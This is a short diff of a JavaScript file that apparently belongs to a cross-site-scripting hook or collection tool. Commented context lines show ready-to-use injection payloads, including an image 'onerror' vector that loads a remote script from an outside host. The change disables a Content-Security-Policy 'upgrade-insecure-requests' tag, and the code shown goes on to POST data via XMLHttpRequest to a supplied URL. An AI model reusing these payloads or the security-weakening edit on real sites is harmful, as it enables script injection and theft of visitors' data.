@@ -3,10 +3,12 @@
      var drc = document.createElement('script');drc.setAttribute("src","https://");document.getElementsByTagName('head')[0].appendChild(drc);
      ["<img src=\"d\" onerror=\"var drc = document.createElement(\'script\');drc.setAttribute(\'src\',\'https://aa/extend.js\');document.getElementsByTagName(\'head\')[0].appendChild(drc);\">"].join("");
     */
-    this.meta = document.createElement('meta');
-    this.meta.content = "upgrade-insecure-requests";
-    this.meta.setAttribute("http-equiv", "Content-Security-Policy");
-    document.getElementsByTagName('head')[0].appendChild(this.meta);
+    /*
+     this.meta = document.createElement('meta');
+     this.meta.content = "upgrade-insecure-requests";
+     this.meta.setAttribute("http-equiv", "Content-Security-Policy");
+     document.getElementsByTagName('head')[0].appendChild(this.meta);
+     */
     this.fn1 = function(o) {
         var xhr = new XMLHttpRequest();
         xhr.open('POST', o.url, true);
